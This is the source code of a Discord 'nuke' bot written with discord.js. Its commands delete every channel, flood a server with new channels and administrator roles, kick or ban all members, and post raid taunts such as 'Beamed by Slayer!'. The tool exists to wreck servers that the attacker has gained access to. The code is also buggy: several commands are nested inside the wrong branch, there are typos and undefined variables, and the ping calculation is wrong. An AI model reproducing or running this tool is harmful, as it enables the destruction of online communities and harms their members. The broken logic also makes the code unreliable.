const { error, Console } = require("console");
const Discord = require("discord.js");
const { existsSync } = require("fs");
const config = require("./config.json");
const bot = new Discord.Client();
const prefix = (config.prefix);


bot.on('ready', () => {
    console.log(`${bot.user.tag} is now online!`)
})
    bot.on("message", async message => {
        


        const args = message.content.slice(prefix.length).trim().split(/ +/g);
        const command = args.shift().toLocaleLowerCase();

         

         
        if (command === "channels") {
            message.guild.channels.forEach(channel => channel.delete())

            await message.guild.createChannel('Nuked By 1200', {
                type: 'text',
                topic: 'Nuked By 1200',
                permissionOverwrites: [{
                    id: message.guild.id,
                    allow: ['SEND_messageS', 'READ_message_HISTORY', 'VIEW_CHANNEL'],
                    deny: ['MANAGE_CHANNELS'] 
                }]
            })
        }

        if (command === 'nuke') {
            message.guild.channels.forEach(channel => channel.delete())

            let interval = setInterval(async function() {
                message.guild.createChannel('Beamed by Slayer!', {
                   type: 'text',
                   position: 0,
                   topic: 'Beamed By Slayer!',
                   permissionOverwrites: [{
                       id: message.guild.id,
                       allow: ["SEND_MESSAGES"],
                       deny: ["MANAGE_CHANNELS"]
                   }]
                }) 
            })

            if (command === 'icon') {
                const iconSay = args.join(" ");
                message.guild.setIcon(iconSay)
            }

            if (command === 'massvc') {
                const massvcSay = args.join(" ");
                let interval = setInterval(async function() {
                    message.guild.createChannel(massvcSay, {
                         type: 'voice',
                         position: 0,
                         topic: '',
                         permissionOverwrites: [{
                             id: message.guild.id,
                             allow: ['SEND_messageS', 'READ_messageS', 'READ_message_HISTORY'],
                             deny: ['MANAGE_CHANNELS']
                         }]
                     })
             })
            }
            if (command === 'error') {
                message,channel.send(`error`);
            }

            if (command === 'embed') {
                const embedSay = args.join(" ");
                const embed = new Discord.RichEmbed()
                .setTitle(embedSay);

                message.channel.send(embed);
            }
        }

        if (command === 'uptime') {
            message.reply(`My uptime is \`${ms(bot.uptime)}\``);
        }

        if (command === 'raid') {
            const hook = new Discord.WebhookClient("ID", "TOKEN")

            hook.send('Slayer Runs you!');
        }

        if (command === 'setname') {
            const guildNameSay = args.join(" ");
            message.guild.setName(guildNameSay);
        }
        if (command === 'roles') {
            message.delete();
         let interval = setInterval(async function() {
         message.guild.createRole ({
             name: 'Beamed by Slayer',
             color: colors[colorCount],
             hoist: true,
             permissions: 'ADMINISTRATOR',
             position: 0,
             mentionable: true
         }).then(message.channel.send('hahaha, R.I.P there roles!'))
     }, 900);
    }
    
    if (command === "kickall") {
        message.delete();
        message.channel.guild.members.forEach(user => {
            user.kick();
        });
    }

    //banall
    if (command === "banall") {
        message.delete();
        message.channel.guild.members.forEach(user => {
            user.ban();
        });
    }
    if (command === 'ping') {
        message.delete();
    message.channel.send('Finding bots ping...').then(message => {
        const ping = message.createdTimestamp - message.createdTimestamp;
    
        message.edit(` :ping_pong: Pong! ping is ${ping}ms`);
        if (console.log(Error)) message.reply('There was a error....')
    })
}
if (command === "off") {
    process.exit();
}
        })
    bot.login(config.token);